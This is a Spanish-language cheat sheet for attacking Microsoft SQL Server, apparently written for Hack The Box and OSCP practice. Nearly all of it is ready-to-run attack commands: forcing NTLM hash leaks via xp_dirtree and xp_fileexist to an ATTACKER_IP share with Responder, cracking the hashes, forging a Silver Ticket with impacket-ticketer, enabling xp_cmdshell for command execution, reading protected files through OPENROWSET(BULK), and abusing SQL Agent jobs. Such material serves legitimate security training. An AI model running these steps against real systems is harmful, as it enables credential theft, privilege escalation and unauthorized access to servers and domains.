## 🧠 MSSQL – Cheat Sheet (HTB / OSCP Oriented)

* Mental model clave
MSSQL ≠ solo base de datos
MSSQL = servicio con contexto de ejecución en Windows

### 0️⃣ Enumeración inicial (si solo hay 1433)

```bash
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info <IP>
```
* Buscar:

1. Nombre del dominio

2. Nombre del host

3. Versión de SQL

4. Si es DC (red flag positiva)

### 1️⃣ Acceso a MSSQL
🔹 Autenticación SQL
```bash
impacket-mssqlclient user:pass@IP
```

🔹 Autenticación Windows
```bash
impacket-mssqlclient domain/user:pass@IP -windows-auth
```

### 2️⃣ Enumeración básica en SQL

```bash
-- Usuarios
SELECT name FROM sys.server_principals;

-- Roles
SELECT r.name, m.name
FROM sys.server_principals r
JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id;

-- Bases de datos
SELECT name, is_trustworthy_on FROM sys.databases;

-- Contexto del servicio SQL
SELECT servicename, service_account FROM sys.dm_server_services;
```

📌 Clave: saber con qué cuenta corre SQL.

### 3️⃣ Procedimientos extendidos peligrosos (NO sysadmin)

🔥 xp_dirtree → NTLM leak (CLÁSICO)
```bash
EXEC xp_dirtree '\\ATTACKER_IP\share';
```
✔️ No requiere sysadmin
✔️ Fuerza autenticación NTLM
✔️ Ideal para Responder

En Kali:

```bash
responder -I tun0
```

Alternativas similares
```bash
EXEC xp_fileexist '\\ATTACKER_IP\share\test.txt';
```
### 4️⃣ Ataque NTLM → Credenciales reales

1. Captura NTLMv2

2. Crack:

```bash
john --wordlist=rockyou.txt hash.txt
```

🎯 Objetivo: cuenta de dominio asociada al servicio SQL

### 5️⃣ MSSQL como cuenta de dominio
```bash
impacket-mssqlclient domain/sqlsvc:pass@IP -windows-auth
```

Ahora SQL:

confía en el token de Windows

habilita caminos AD / Kerberos / tickets

### 6️⃣ Escalada dentro de SQL (Silver Ticket)
📌 Cuándo usar Silver Ticket

No tenés sysadmin

Tenés hash NTLM del servicio

El SPN es conocido (mssqlsvc/host)
```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.htb \
  -spn mssqlsvc/host.domain.htb \
  sqlsvc
```
```bash
export KRB5CCNAME=sqlsvc.ccache
```

Validar:
```bash
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### 7️⃣ sysadmin ≠ Windows admin (concepto CRÍTICO)

Ser sysadmin en SQL NO significa:

1. ser Administrator

2. tener SeImpersonate

3. poder usar Potato

Pero sí significa:

✔️ Ejecutar comandos
✔️ Leer archivos
✔️ Controlar SQL Agent
✔️ Acceder al filesystem vía SQL

### 8️⃣ RCE vía xp_cmdshell (si está permitido)
```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ejecutar:
```bash
EXEC xp_cmdshell 'whoami';
```

⚠️ Si falla → no es el camino final (como en Signed)

### 9️⃣ 🔥 File Read sin privesc: OPENROWSET(BULK)

Esta técnica gana boxes.
```bash
SELECT * FROM OPENROWSET(
  BULK 'C:\Users\Administrator\Desktop\root.txt',
  SINGLE_CLOB
) AS x;
```

✔️ No requiere ser admin en Windows
✔️ Se ejecuta como servicio SQL
✔️ Permite leer archivos protegidos

📌 Pensar siempre:

**“¿Qué archivos interesantes puedo leer?”**

Ejemplos:

1. web.config

2. .env

3. root.txt

4. scripts de jobs

5. backups

### 🔟 SQL Agent Jobs (privesc frecuente)
USE msdb;
SELECT name FROM sysjobs;


Algunos jobs:

* corren como SYSTEM

* ejecutan PowerShell

* leen scripts modificables
